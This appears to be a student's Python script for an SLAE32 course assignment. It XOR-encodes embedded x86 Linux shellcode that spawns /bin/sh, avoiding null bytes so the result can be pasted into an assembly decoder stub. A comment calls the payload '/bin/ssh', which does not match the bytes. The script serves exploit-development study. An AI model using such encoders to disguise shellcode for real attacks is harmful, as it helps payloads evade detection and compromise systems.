#!/usr/bin/python3
import sys
# author     : Sandro "guly" Zaccarini SLAE-1037
# purpose    : this program has been written for SLAE32 assignment 4, create your own crypter
# license    : CC-BY-NC-SA

if sys.version_info[0] < 3:
    raise Exception("Must be using Python 3")

def do_xor(bxor,inc=1):
    head = hex(bxor)+'+'+str(inc)+' '
    ret = ''
    # reverse loop, because i liked that way
    l = len(bytearray(sc))
    while l > 1:
        l = l-1
        # current byte
        x = sc[l]
        # prev byte, -1 because /bin//sh will provide a 0x00
        y = sc[l-1]+inc

        z = x^y
        # formatting for py
        #z = '\\x{:02x}'.format(z)
        # formatting for asm
        z = ',0x{:02x}'.format(z)
        z = z+ret
        ret = z

    z = sc[1]^bxor
    # formatting for py
    #z = '\\x{:02x}'.format(z)
    # formatting for asm
    z = '0x{:02x}'.format(z)
    z = z+ret
    ret = head + z
    if "00" in ret:
        return False
    else:
        return ret



# execve /bin/ssh
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80'
bxor = 0xA1 # because i like to start with a nop

# useful to find valid starting xor value
#for i in range(255):
#    # and inc value
#    for l in range(1,10):
#        ret = do_xor(i,l)
#        if ret:
#            print(ret)

print(do_xor(bxor,1))
terminator = ord(sc[-1:])+1
print("\ni'm not adding terminator automatically here, add it yourself if you need it at unxor.asm Shellcode: \\x%x" % terminator)
